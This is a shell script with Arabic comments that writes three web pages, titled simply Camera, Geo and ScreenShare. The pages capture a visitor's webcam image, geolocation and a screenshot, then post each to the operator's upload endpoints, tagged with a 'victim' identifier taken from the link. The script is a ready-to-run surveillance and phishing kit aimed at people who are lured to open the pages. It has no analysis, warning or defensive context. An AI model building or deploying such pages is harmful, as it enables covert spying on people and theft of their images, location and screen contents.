# إنشاء مجلد التخزين
mkdir -p uploads

# إنشاء camera.html
cat <<EOF > camera.html
<!DOCTYPE html>
<html>
<head>
  <title>Camera</title>
</head>
<body>
  <script>
    const params = new URLSearchParams(window.location.search);
    const victim = params.get('victim');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');

        setTimeout(() => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          stream.getTracks().forEach(track => track.stop());

          canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('file', blob, 'capture.jpg');
            formData.append('victim', victim);

            fetch('/upload/camera', {
              method: 'POST',
              body: formData
            }).then(() => {
              alert('Captured and sent');
            });
          }, 'image/jpeg');
        }, 2000);
      });
  </script>
</body>
</html>
EOF

# إنشاء geo.html
cat <<EOF > geo.html
<!DOCTYPE html>
<html>
<head>
  <title>Geo</title>
</head>
<body>
  <script>
    const params = new URLSearchParams(window.location.search);
    const victim = params.get('victim');

    navigator.geolocation.getCurrentPosition(pos => {
      const data = {
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        timestamp: Date.now(),
        victim: victim
      };

      fetch('/upload/geo', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      }).then(() => {
        alert('Location sent');
      });
    });
  </script>
</body>
</html>
EOF

# إنشاء screenshare.html
cat <<EOF > screenshare.html
<!DOCTYPE html>
<html>
<head>
  <title>ScreenShare</title>
</head>
<body>
  <script>
    const params = new URLSearchParams(window.location.search);
    const victim = params.get('victim');

    navigator.mediaDevices.getDisplayMedia({ video: true })
      .then(stream => {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        const canvas = document.createElement('canvas');
        const context = canvas.getContext('2d');

        setTimeout(() => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          stream.getTracks().forEach(track => track.stop());

          canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('file', blob, 'screen.jpg');
            formData.append('victim', victim);

            fetch('/upload/screenshare', {
              method: 'POST',
              body: formData
            }).then(() => {
              alert('Screenshot sent');
            });
          }, 'image/jpeg');
        }, 2000);
      });
  </script>
</body>
</html>
EOF

echo "✅ All required files created: uploads/, camera.html, geo.html, screenshare.html"
